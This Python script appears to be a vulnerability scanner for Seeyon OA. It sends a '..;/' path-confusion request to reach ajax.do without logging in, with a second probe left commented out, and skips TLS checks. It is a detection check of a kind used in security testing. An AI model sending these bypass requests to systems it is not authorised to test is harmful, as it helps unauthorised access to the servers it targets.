import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"seeyon/thirdpartyController.do.css/..;/ajax.do"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "java.lang.NullPointerException:null" in response.text:
		r0=True
	else:
		r0=False
	# url=baseurl+"/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
	# headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	# response=requests.get(url,headers=headers,timeout=5,verify=False)
	# reditList = response.history
	# if len(reditList)>0:
	# 	f_list=[]
	# 	for response in reditList:
	# 		if response.status_code == 200 and "MMOneProfile" in response.text and "productTags" in response.text and "serverIdentifier" in response.text and "application/json" in response.headers["Content-Type"]:
	# 			f_list.append(1)
	# 	if len(f_list)==1:
	# 		r1=True
	# 	else:
	# 		r1=False
	# else:
	# 	if response.status_code == 200 and "MMOneProfile" in response.text and "productTags" in response.text and "serverIdentifier" in response.text and "application/json" in response.headers["Content-Type"]:
	# 		r1=True
	# 	else:
	# 		r1=False
	if r0:
		return True
	else:
		return False
